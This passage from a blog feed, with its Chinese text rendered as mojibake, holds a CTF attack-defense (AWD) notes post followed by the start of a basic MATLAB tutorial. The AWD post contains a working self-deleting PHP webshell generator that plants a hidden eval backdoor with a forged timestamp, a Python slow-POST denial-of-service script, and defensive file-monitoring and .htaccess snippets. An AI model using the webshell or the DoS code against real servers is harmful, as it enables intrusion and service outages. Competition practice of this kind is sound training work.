class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs php">ç”Ÿæˆä¸æ­»é©¬<br><span class="hljs-meta">&lt;?php</span><br>    <span class="hljs-title function_ invoke__">ignore_user_abort</span>(<span class="hljs-literal">true</span>);  <span class="hljs-comment">//è®¾ç½®ä¸å®¢æˆ·æœºæ–­å¼€æ˜¯å¦ä¼šç»ˆæ­¢è„šæœ¬çš„æ‰§è¡Œï¼Œtrueåˆ™ä¸ä¼š</span><br>    <span class="hljs-title function_ invoke__">set_time_limit</span>(<span class="hljs-number">0</span>);  <span class="hljs-comment">//å¦‚æœä¸ºé›¶è¯´æ˜æ°¸ä¹…æ‰§è¡Œç›´åˆ°ç¨‹åºç»“æŸ</span><br>    <span class="hljs-title function_ invoke__">unlink</span>(<span class="hljs-keyword">__FILE__</span>);  <span class="hljs-comment">//åˆ é™¤æ–‡ä»¶æœ¬èº«,è°ƒç”¨unlink()çš„æ—¶å€™ï¼Œæ–‡ä»¶è¿˜æ˜¯å­˜åœ¨çš„ï¼Œåªæ˜¯ç›®å½•é‡Œæ‰¾ä¸åˆ°è¯¥æ–‡ä»¶äº†</span><br>    <span class="hljs-variable">$file</span>=<span class="hljs-string">&#x27;./.index1.php&#x27;</span>;  <span class="hljs-comment">//ç”Ÿæˆçš„æœ¨é©¬æ–‡ä»¶åä¸º .index1.php</span><br>    <span class="hljs-variable">$code</span>=<span class="hljs-string">&#x27;&lt;?php</span><br><span class="hljs-string">        //ç»™æœ¨é©¬è®¾ç½®å¯†ç ï¼Œé˜²æ­¢ä»–äººä½¿ç”¨</span><br><span class="hljs-string">        if(md5($_POST[&quot;pass&quot;])==&quot;29b8babad580b5607470f6e01e90e27a&quot;)&#123;  //å¯†ç ï¼šnichousha</span><br><span class="hljs-string">            @eval($_POST[&quot;cmd&quot;]);</span><br><span class="hljs-string">        &#125;?&gt;&#x27;</span>;<br>    <span class="hljs-keyword">while</span>(<span class="hljs-number">1</span>)&#123;<br>        <span class="hljs-title function_ invoke__">file_put_contents</span>(<span class="hljs-variable">$file</span>,<span class="hljs-variable">$code</span>);<br>        <span class="hljs-title function_ invoke__">system</span>(<span class="hljs-string">&#x27;touch -m -d &quot;2022-05-28 9:10:12&quot; .index1.php&#x27;</span>);  <span class="hljs-comment">//è®¾ç½®æ–‡ä»¶çš„ç¼–è¾‘æ—¶é—´</span><br>        <span class="hljs-title function_ invoke__">usleep</span>(<span class="hljs-number">5000</span>);  <span class="hljs-comment">//æ¯éš”usleep(5000)å†™å…¥ä¸€ä¸ªæ–°æ–‡ä»¶</span><br>    &#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs php">killä¸æ­»é©¬<br><span class="hljs-meta">&lt;?php</span> <br>    <span class="hljs-title function_ invoke__">ignore_user_abort</span>(<span class="hljs-literal">true</span>);<br>    <span class="hljs-title function_ invoke__">set_time_limit</span>(<span class="hljs-number">0</span>);<br>    <span class="hljs-title function_ invoke__">unlink</span>(<span class="hljs-keyword">__FILE__</span>);<br>    <span class="hljs-variable">$file</span> = <span class="hljs-string">&#x27;.index1.php&#x27;</span>;<br>    <span class="hljs-variable">$code</span> = <span class="hljs-string">&#x27;hi springbird !&#x27;</span>;<br>    <span class="hljs-comment">//pass=pass</span><br>    <span class="hljs-keyword">while</span> (<span class="hljs-number">1</span>)&#123;<br>        <span class="hljs-title function_ invoke__">file_put_contents</span>(<span class="hljs-variable">$file</span>,<span class="hljs-variable">$code</span>);<br>        <span class="hljs-title function_ invoke__">system</span>(<span class="hljs-string">&#x27;touch -m -d &quot;2022-05-28 09:10:12&quot; .index1.php&#x27;</span>);<br>    <span class="hljs-comment">//    usleep(5000);</span><br>          <span class="hljs-title function_ invoke__">usleep</span>(<span class="hljs-number">1000</span>);<br>    &#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>5.å…¨è‡ªåŠ¨åŒ–è®¾ç½®</p><figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><code class="hljs livecodeserver">dos<br>import <span class="hljs-built_in">socket</span><br>import <span class="hljs-built_in">time</span><br>import threading<br><br><span class="hljs-built_in">max</span>=<span class="hljs-number">90000000</span><br>port=<span class="hljs-number">80</span>                 <span class="hljs-comment">#ç«¯å£</span><br>host=<span class="hljs-string">&quot;192.168.92.154&quot;</span>   <span class="hljs-comment">#IP</span><br>page=<span class="hljs-string">&quot;/index.php&quot;</span><br><br>bag=(<span class="hljs-string">&quot;POST %s HTTP/1.1\r\n&quot;</span><br>    <span class="hljs-string">&quot;host: %s\r\n&quot;</span><br>    <span class="hljs-string">&quot;Content-Length: 1000000000\r\n&quot;</span><br>    <span class="hljs-string">&quot;Cookie: 1998\r\n&quot;</span><br>    <span class="hljs-string">&quot;\r\n&quot;</span> % (page,host))<br><br>socks = []<br><br>def connect():<br>    <span class="hljs-built_in">global</span> socks<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(<span class="hljs-number">0</span>,<span class="hljs-built_in">max</span>):<br>        s = <span class="hljs-built_in">socket</span>.<span class="hljs-built_in">socket</span>(<span class="hljs-built_in">socket</span>.AF_INET,<span class="hljs-built_in">socket</span>.SOCK_STREAM)<br>        <span class="hljs-keyword">try</span>:<br>            s.connect((host,port))<br>            s.<span class="hljs-built_in">send</span>(bag.encode(<span class="hljs-string">&quot;utf-8&quot;</span>))<br>            socks.append(s)<br>        except Exception <span class="hljs-keyword">as</span> ex:<br>            <span class="hljs-built_in">time</span>.sleep(<span class="hljs-number">1</span>)<br><br>def <span class="hljs-built_in">send</span>():<br>    <span class="hljs-built_in">global</span> socks<br>    <span class="hljs-keyword">while</span> True:<br>        <span class="hljs-keyword">for</span> s <span class="hljs-keyword">in</span> socks:<br>            <span class="hljs-keyword">try</span>:<br>                print(<span class="hljs-string">&quot;æ”»å‡»ä¸­....&quot;</span>)<br>            except Exception <span class="hljs-keyword">as</span> ex:<br>                socks.remove(s)<br>                s.<span class="hljs-built_in">close</span>()<br>        <span class="hljs-built_in">time</span>.sleep(<span class="hljs-number">0.1</span>)<br><br>One = threading.Thread(target=connect,args=())<br>Two = threading.Thread(target=<span class="hljs-built_in">send</span>,args=())<br>One.<span class="hljs-built_in">start</span>()<br>Two.<span class="hljs-built_in">start</span>()<br></code></pre></td></tr></table></figure><figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><code class="hljs livecodeserver">æ–‡ä»¶ç›‘æ§<br><span class="hljs-comment">#!/usr/bin/python</span><br><span class="hljs-comment">#coding=utf-8</span><br><span class="hljs-comment">#Usage:python2 demo.py</span><br><br><span class="hljs-comment">#æ³¨æ„ï¼šè¦å°†æ­¤æ–‡ä»¶æ”¾åœ¨æœ‰è¯»å†™æƒé™çš„ç›®å½•ä»¥åŠæ‰€æœ‰ä¿®æ”¹è¿‡çš„phpå¿…é¡»åœ¨æ­¤ç›®å½•æˆ–è€…è¯¥ç›®å½•çš„å­ç›®å½•ä¸­ã€‚</span><br><span class="hljs-comment">#ä½œç”¨ï¼šè¯»å–è¢«ä¿®æ”¹è¿‡çš„æ–‡ä»¶ï¼Œç„¶åå°†æ–‡ä»¶çš„åœ°å€åŠ ä¸Šå†…å®¹å…¨éƒ¨å­˜æ”¾åœ¨txt</span><br><br><br>import sys,subprocess,os<br><span class="hljs-comment">#æŸ¥æ‰¾æœ€è¿‘10åˆ†é’Ÿè¢«ä¿®æ”¹çš„æ–‡ä»¶</span><br>def scanfile():<br><span class="hljs-comment">#command: find -name &#x27;*.php&#x27; -mmin -10</span><br><span class="hljs-keyword">command</span> = <span class="hljs-string">&quot;find -name \&#x27;*.php\&#x27; -mmin -10&quot;</span><br>su = subprocess.Popen(<span class="hljs-keyword">command</span>,<span class="hljs-title">shell</span>=<span class="hljs-title">True</span>,<span class="hljs-title">stdin</span>=<span class="hljs-title">subprocess</span>.<span class="hljs-title">PIPE</span>,<span class="hljs-title">stdout</span>=<span class="hljs-title">subprocess</span>.<span class="hljs-title">PIPE</span>,<span class="hljs-title">stderr</span>=<span class="hljs-title">subprocess</span>.<span class="hljs-title">PIPE</span>)<br>STDOUT,STDERR = su.communicate()<br>list = STDOUT.<span class="hljs-built_in">split</span>(<span class="hljs-string">&quot;\n&quot;</span>)<br><span class="hljs-comment">#print str(list)</span><br><span class="hljs-comment">#å°†æ–‡ä»¶å¤„ç†æˆlistç±»å‹ç„¶åè¿”å›ã€‚</span><br><span class="hljs-literal">return</span> list<br><br><span class="hljs-comment">#è¯»å–æ–‡ä»¶ï¼š</span><br>def loadfile(addr):<br>data = <span class="hljs-string">&quot;&quot;</span><br><span class="hljs-comment">#å¦‚æœæ–‡ä»¶ä¸å­˜åœ¨å°±è·³å‡ºå‡½æ•°</span><br><span class="hljs-keyword">try</span> :<br><span class="hljs-built_in">file</span> = <span class="hljs-built_in">open</span>(addr,<span class="hljs-string">&#x27;r&#x27;</span>)<br>data = <span class="hljs-built_in">file</span>.<span class="hljs-built_in">read</span>()<br>except : <br><span class="hljs-literal">return</span> <span class="hljs-number">0</span><br>all_data = addr+<span class="hljs-string">&quot;\n&quot;</span>+data+<span class="hljs-string">&quot;\n\n&quot;</span><br>file1 = <span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;shell.txt&quot;</span>,<span class="hljs-string">&#x27;a+&#x27;</span>)<br><span class="hljs-comment">#é¿å…é‡å¤å†™å…¥</span><br><span class="hljs-keyword">try</span>:<br>shell_content = file1.<span class="hljs-built_in">read</span>()<br>except:<br>shell_content = <span class="hljs-string">&quot;null&quot;</span><br><span class="hljs-comment">#å¦‚æœæ–‡ä»¶å†…å®¹ä¸ä¸ºç©ºå†å†™å…¥ï¼Œé¿å…å†™å…¥ç©ºçš„ã€‚</span><br><span class="hljs-comment">#print shell_content</span><br><span class="hljs-keyword">if</span> data :<br><span class="hljs-keyword">if</span> all_data <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> shell_content:<br>file1.<span class="hljs-built_in">write</span>(all_data)<br><span class="hljs-built_in">file</span>.<span class="hljs-built_in">close</span>()<br>file1.<span class="hljs-built_in">close</span>()<br>rm_cmd = <span class="hljs-string">&quot;rm -rf &quot;</span>+addr<br>su = subprocess.Popen(rm_cmd,<span class="hljs-built_in">shell</span>=True,<span class="hljs-keyword">stdin</span>=subprocess.PIPE,<span class="hljs-keyword">stdout</span>=subprocess.PIPE,<span class="hljs-keyword">stderr</span>=subprocess.PIPE)<br>su.communicate()<br>print <span class="hljs-string">&quot;loadfile over : &quot;</span>+addr<br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br><span class="hljs-keyword">while</span> True:<br><br>list = scanfile()<br><span class="hljs-keyword">if</span> list :<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(<span class="hljs-built_in">len</span>(list)):<br><span class="hljs-comment">#å¦‚æœlist[i]ä¸ºç©ºå°±ä¸è¯»å–äº†</span><br><span class="hljs-keyword">if</span> list[i]:<br>loadfile(str(list[i]))<br><span class="hljs-keyword">else</span> : pass<br></code></pre></td></tr></table></figure><figure class="highlight crmsh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs crmsh">.htaccess<br><span class="hljs-tag">&lt;FilesMatch &quot;\.(?i:php|php3|php4|php5)&quot;&gt;</span><br><span class="hljs-keyword">Order</span>  <span class="hljs-title">allow</span>,<span class="hljs-keyword">deny</span><br>    <span class="hljs-keyword">Deny</span>  from  all<br><span class="hljs-tag">&lt;/FilesMatch&gt;</span><br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>CTF AWD</category>
      
    </categories>
    
    
    <tags>
      
      <tag>AWD</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>æ•°å­¦å»ºæ¨¡</title>
    <link href="/2024/09/23/%E6%95%B0%E5%AD%A6%E5%BB%BA%E6%A8%A1/"/>
    <url>/2024/09/23/%E6%95%B0%E5%AD%A6%E5%BB%BA%E6%A8%A1/</url>
    
    <content type="html"><![CDATA[<h1 id="MATLABæ“ä½œ"><a href="#MATLABæ“ä½œ" class="headerlink" title="MATLABæ“ä½œ"></a>MATLABæ“ä½œ</h1><h2 id="ä¸€ã€MATLAB-åŸºç¡€æ“ä½œ"><a href="#ä¸€ã€MATLAB-åŸºç¡€æ“ä½œ" class="headerlink" title="ä¸€ã€MATLAB åŸºç¡€æ“ä½œ"></a><strong>ä¸€ã€MATLAB åŸºç¡€æ“ä½œ</strong></h2><h3 id="1-1-å˜é‡ä¸è¿ç®—"><a href="#1-1-å˜é‡ä¸è¿ç®—" class="headerlink" title="1.1 å˜é‡ä¸è¿ç®—"></a><strong>1.1 å˜é‡ä¸è¿ç®—</strong></h3><p>MATLAB çš„å˜é‡æ˜¯çŸ©é˜µæˆ–æ•°ç»„ã€‚ä»¥ä¸‹æ˜¯ä¸€äº›åŸºæœ¬æ“ä½œï¼š</p><h4 id="å®ä¾‹-1ï¼šç®€å•è¿ç®—"><a href="#å®ä¾‹-1ï¼šç®€å•è¿ç®—" class="headerlink" title="å®ä¾‹ 1ï¼šç®€å•è¿ç®—"></a><strong>å®ä¾‹ 1ï¼šç®€å•è¿ç®—</strong></h4><figure class="highlight prolog"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs prolog"><span class="hljs-comment">% å®šä¹‰å˜é‡</span><br>a = <span class="hljs-number">5</span>;      <span class="hljs-comment">% æ ‡é‡</span><br>b = [<span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">3</span>];  <span class="hljs-comment">% è¡Œå‘é‡</span><br>c = [<span class="hljs-number">1</span>; <span class="hljs-number">2</span>; <span class="hljs-number">3</span>];  <span class="hljs-comment">% åˆ—å‘é‡</span><br><br><span class="hljs-comment">% è®¡ç®—</span><br>sum_b = sum(b);     <span class="hljs-comment">% è®¡ç®—å‘é‡å…ƒç´ å’Œ</span><br>product_c = prod(c); <span class="hljs-comment">% è®¡ç®—å‘é‡å…ƒç´ ç§¯</span><br>square_a = a^<span class="hljs-number">2</span>;     <span class="hljs-comment">% è®¡ç®— a çš„å¹³æ–¹</span><br></code></pre></td></tr></table></figure><ul><li><code>sum(b)</code> è®¡ç®—å‘é‡ <code>b</code> çš„å…ƒç´ å’Œï¼Œç»“æœä¸º <code>6</code>ã€‚</li><li><code>prod(c)</code> è®¡ç®—åˆ—å‘é‡ <code>c</code> çš„å…ƒç´ ç§¯ï¼Œç»“æœä¸º <code>6</code>ã€‚</li></ul><hr><h3 id="1-2-çŸ©é˜µæ“ä½œ"><a href="#1-2-çŸ©é˜µæ“ä½œ" class="headerlink" title="1.2 çŸ©é˜µæ“ä½œ"></a><strong>1.2 çŸ©é˜µæ“ä½œ</strong></h3><p>MATLAB æœ€æ“…é•¿çš„æ˜¯çŸ©é˜µè®¡ç®—ã€‚</p><h4 id="å®ä¾‹-2ï¼šçŸ©é˜µæ“ä½œ"><a href="#å®ä¾‹-2ï¼šçŸ©é˜µæ“ä½œ" class="headerlink" title="å®ä¾‹ 2ï¼šçŸ©é˜µæ“ä½œ"></a><strong>å®ä¾‹ 2ï¼šçŸ©é˜µæ“ä½œ</strong></h4><figure class="highlight prolog"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs prolog"><span class="hljs-comment">% å®šä¹‰çŸ©é˜µ</span><br><span class="hljs-symbol">A</span> = [<span class="hljs-number">1</span>, <span class="hljs-number">2</span>; <span class="hljs-number">3</span>, <span class="hljs-number">4</span>];   <span class="hljs-comment">% 2x2 çŸ©é˜µ</span><br><span class="hljs-symbol">B</span> = [<span class="hljs-number">5</span>, <span class="hljs-number">6</span>; <span class="hljs-number">7</span>, <span class="hljs-number">8</span>];   <span class="hljs-comment">% 2x2 çŸ©é˜µ</span><br><br><span class="hljs-comment">% çŸ©é˜µåŸºæœ¬è¿ç®—</span><br><span class="hljs-symbol">C</span> = <span class="hljs-symbol">A</span> + <span class="hljs-symbol">B</span>;   <span class="hljs-comment">% çŸ©é˜µåŠ æ³•</span><br><span class="hljs-symbol">D</span> = <span class="hljs-symbol">A</span> * <span class="hljs-symbol">B</span>;   <span class="hljs-comment">% çŸ©é˜µä¹˜æ³•</span><br><span class="hljs-symbol">E</span> = <span class="hljs-symbol">A</span> .* <span class="hljs-symbol">B</span>;  <span class="hljs-comment">% å…ƒç´ é€é¡¹ç›¸ä¹˜</span><br><span class="hljs-symbol">F</span> = inv(<span class="hljs-symbol">A</span>);  <span class="hljs-comment">% è®¡ç®—é€†çŸ©é˜µ</span><br></code></pre></td></tr></table></figure><ul><li><code>A + B</code> ç»“æœæ˜¯çŸ©é˜µçš„é€å…ƒç´ ç›¸åŠ ã€‚</li><li><code>A .* B</code> æ˜¯çŸ©é˜µå¯¹åº”å…ƒç´ é€é¡¹ç›¸ä¹˜ï¼Œè€Œ <code>A * B</code> æ˜¯çŸ©é˜µä¹˜æ³•ã€‚</li><li><code>inv(A)</code> è¿”å›çŸ©é˜µ <code>A</code> çš„é€†çŸ©é˜µã€‚</li></ul><hr><h3 id="1-3-ç»˜å›¾"><a href="#1-3-ç»˜å›¾" class="headerlink" title="1.3 ç»˜å›¾"></a><strong>1.3 ç»˜å›¾</strong></h3><p>MATLAB æä¾›äº†å¼ºå¤§çš„ç»˜å›¾åŠŸèƒ½ï¼Œå¯ä»¥ç»˜åˆ¶å„ç§ç±»å‹çš„å›¾è¡¨ã€‚</p><h4 id="å®ä¾‹-3ï¼šç»˜åˆ¶äºŒç»´æ›²çº¿"><a href="#å®ä¾‹-3ï¼šç»˜åˆ¶äºŒç»´æ›²çº¿" class="headerlink" title="å®ä¾‹ 3ï¼šç»˜åˆ¶äºŒç»´æ›²çº¿"></a><strong>å®ä¾‹ 3ï¼šç»˜åˆ¶äºŒç»´æ›²çº¿</strong></h4><figure class="highlight gml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs gml"><span class="hljs-variable language_">x</span> = <span class="hljs-number">0</span>:<span class="hljs-number">0.1</span>:<span class="hljs-number">10</span>;           % å®šä¹‰ <span class="hljs-variable language_">x</span> è½´æ•°æ®<br><span class="hljs-variable language_">y</span> = <span class="hljs-built_in">sin</span>(<span class="hljs-variable language_">x</span>);             % å®šä¹‰ <span class="hljs-variable language_">y</span> è½´æ•°æ®<br><br>% ç»˜åˆ¶æ­£å¼¦å‡½æ•°å›¾åƒ<br>plot(<span class="hljs-variable language_">x</span>, <span class="hljs-variable language_">y</span>, <span class="hljs-string">&#x27;r&#x27;</span>, <span class="hljs-string">&#x27;LineWidth&#x27;</span>, <span class="hljs-number">2</span>);  % ç»˜åˆ¶çº¢è‰²æ›²çº¿<br>xlabel(<span class="hljs-string">&#x27;x&#x27;</span>);          % è®¾ç½® <span class="hljs-variable language_">x</span> è½´æ ‡ç­¾<br>ylabel(<span class="hljs-string">&#x27;sin(x)&#x27;</span>);     % è®¾ç½® <span class="hljs-variable language_">y</span> è½´æ ‡ç­¾<br>title(<span class="hljs-string">&#x27;Sine Function&#x27;</span>);   % è®¾ç½®å›¾è¡¨æ ‡é¢˜<br>grid on;             % æ˜¾ç¤ºç½‘æ ¼<br></code></pre></td></tr></table></figure><ul><li><code>plot(x, y)</code> ç»˜åˆ¶äº†æ­£å¼¦å‡½æ•°çš„äºŒç»´å›¾åƒã€‚</li><li><code>xlabel()</code>ã€<code>ylabel()</code> å’Œ <code>title()</code> åˆ†åˆ«è®¾ç½®åæ ‡è½´æ ‡ç­¾å’Œå›¾åƒæ ‡é¢˜ã€‚</li></ul><hr><h3 id="1-4-æ¡ä»¶ä¸å¾ªç¯"><a href="#1-4-æ¡ä»¶ä¸å¾ªç¯" class="headerlink" title="1.4 æ¡ä»¶ä¸å¾ªç¯"></a><strong>1.4 æ¡ä»¶ä¸å¾ªç¯</strong></h3><h4 id="å®ä¾‹-4ï¼šæ¡ä»¶åˆ¤æ–­ä¸å¾ªç¯"><a href="#å®ä¾‹-4ï¼šæ¡ä»¶åˆ¤æ–­ä¸å¾ªç¯" class="headerlink" title="å®ä¾‹ 4ï¼šæ¡ä»¶åˆ¤æ–­ä¸å¾ªç¯"></a><strong>å®ä¾‹ 4ï¼šæ¡ä»¶åˆ¤æ–­ä¸å¾ªç¯</strong></h4><figure class="highlight matlab"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs matlab"><span class="hljs-comment">% æ¡ä»¶è¯­å¥</span><br>x = <span class="hljs-number">3</span>;<br><span class="hljs-keyword">if</span> x &gt; <span class="hljs-number">0</span><br>    <span class="hljs-built_in">disp</span>(<span class="hljs-string">&#x27;x æ˜¯æ­£æ•°&#x27;</span>);<br><span class="hljs-keyword">elseif</span> x == <span class="hljs-number">0</span><br>    <span class="hljs-built_in">disp</span>(<span class="hljs-string">&#x27;x æ˜¯é›¶&#x27;</span>);<br><span class="hljs-keyword">else</span><br>    <span class="hljs-built_in">disp</span>(<span class="hljs-string">&#x27;x æ˜¯è´Ÿæ•°&#x27;</span>);<br><span class="hljs-keyword">end</span><br><br><span class="hljs-comment">% å¾ªç¯</span><br><span class="hljs-keyword">for</span> <span class="hljs-built_in">i</span> = <span class="hljs-number">1</span>:<span class="hljs-number">5</span><br>    fprintf(<span class="hljs-string">&#x27;å½“å‰å€¼: %d\n&#x27;</span>, <span class="hljs-built_in">i</span>);  <span class="hljs-comment">% æ ¼å¼åŒ–è¾“å‡º</span><br><span class="hljs-keyword">end</span><br></code></pre></td></tr></table></figure><hr><h2 id="äºŒã€æ•°æ®åˆ†æä¸å¤„ç†"><a href="#äºŒã€æ•°æ®åˆ†æä¸å¤„ç†" class="headerlink" title="äºŒã€æ•°æ®åˆ†æä¸å¤„ç†"></a><strong>äºŒã€æ•°æ®åˆ†æä¸å¤„ç†</strong></h2><h3 id="2-1-å¯¼å…¥æ•°æ®"><a href="#2-1-å¯¼å…¥æ•°æ®" class="headerlink" title="2.1 å¯¼å…¥æ•°æ®"></a><strong>2.1 å¯¼å…¥æ•°æ®</strong></h3><p>MATLAB æ”¯æŒå¤šç§æ•°æ®æ ¼å¼çš„å¯¼å…¥ï¼ŒåŒ…æ‹¬ Excelã€CSV å’Œ MAT æ–‡ä»¶ã€‚</p><h4 id="å®ä¾‹-5ï¼šè¯»å–-CSV-æ–‡ä»¶"><a href="#å®ä¾‹-5ï¼šè¯»å–-CSV-æ–‡ä»¶" class="headerlink" title="å®ä¾‹ 5ï¼šè¯»å– CSV æ–‡ä»¶"></a><strong>å®ä¾‹ 5ï¼šè¯»å– CSV æ–‡ä»¶</strong></h4><figure class="highlight erlang-repl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs erlang-repl"><span class="hljs-comment">% è¯»å– CSV æ–‡ä»¶</span><br>data = readmatrix(<span class="hljs-string">&#x27;data.csv&#x27;</span>);  <span class="hljs-comment">% ä» CSV æ–‡ä»¶ä¸­è¯»å–æ•°æ®</span><br></code></pre></td></tr></table></figure><hr><h3 id="2-2-æ•°æ®å¯è§†åŒ–"><a href="#2-2-æ•°æ®å¯è§†åŒ–" class="headerlink" title="2.2 æ•°æ®å¯è§†åŒ–"></a><strong>2.2 æ•°æ®å¯è§†åŒ–</strong></h3><p>å¯ä»¥ä½¿ç”¨å¤šç§å›¾è¡¨æ¥å±•ç¤ºæ•°æ®ã€‚</p><h4 id="å®ä¾‹-6ï¼šç»˜åˆ¶æŸ±çŠ¶å›¾"><a href="#å®ä¾‹-6ï¼šç»˜åˆ¶æŸ±çŠ¶å›¾" class="headerlink" title="å®ä¾‹ 6ï¼šç»˜åˆ¶æŸ±çŠ¶å›¾"></a><strong>å®ä¾‹ 6ï¼šç»˜åˆ¶æŸ±çŠ¶å›¾</strong></h4><figure class="highlight gml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs gml"><span class="hljs-variable language_">x</span> = categorical(&#123;<span class="hljs-string">&#x27;A&#x27;</span>, <span class="hljs-string">&#x27;B&#x27;</span>, <span class="hljs-string">&#x27;C&#x27;</span>&#125;); % åˆ†ç±»æ•°æ®<br><span class="hljs-variable language_">y</span> = [<span class="hljs-number">10</span>, <span class="hljs-number">15</span>, <span class="hljs-number">20</span>];                % å¯¹åº”çš„å€¼<br><br>% ç»˜åˆ¶æŸ±çŠ¶å›¾<br>bar(<span class="hljs-variable language_">x</span>, <span class="hljs-variable language_">y</span>);<br>xlabel(<span class="hljs-string">&#x27;Category&#x27;</span>);<br>ylabel(<span class="hljs-string">&#x27;Value&#x27;</span>);<br>title(<span class="hljs-string">&#x27;Bar Chart Example&#x27;</span>);<br></code></pre></td></tr></table></figure><hr><h2 id="ä¸‰ã€æ•°å­¦å»ºæ¨¡ä¸æ±‚è§£"><a href="#ä¸‰ã€æ•°å­¦å»ºæ¨¡ä¸æ±‚è§£" class="headerlink" title="ä¸‰ã€æ•°å­¦å»ºæ¨¡ä¸æ±‚è§£"></a><strong>ä¸‰ã€æ•°å­¦å»ºæ¨¡ä¸æ±‚è§£</strong></h2><h3 id="3-1-æ±‚è§£çº¿æ€§æ–¹ç¨‹ç»„"><a href="#3-1-æ±‚è§£çº¿æ€§æ–¹ç¨‹ç»„" class="headerlink" title="3.1 æ±‚è§£çº¿æ€§æ–¹ç¨‹ç»„"></a><strong>3.1 æ±‚è§£çº¿æ€§æ–¹ç¨‹ç»„</strong></h3><h4 id="å®ä¾‹-7ï¼šAx-b-çš„è§£"><a href="#å®ä¾‹-7ï¼šAx-b-çš„è§£" class="headerlink" title="å®ä¾‹ 7ï¼šAx &#x3D; b çš„è§£"></a><strong>å®ä¾‹ 7ï¼šAx &#x3D; b 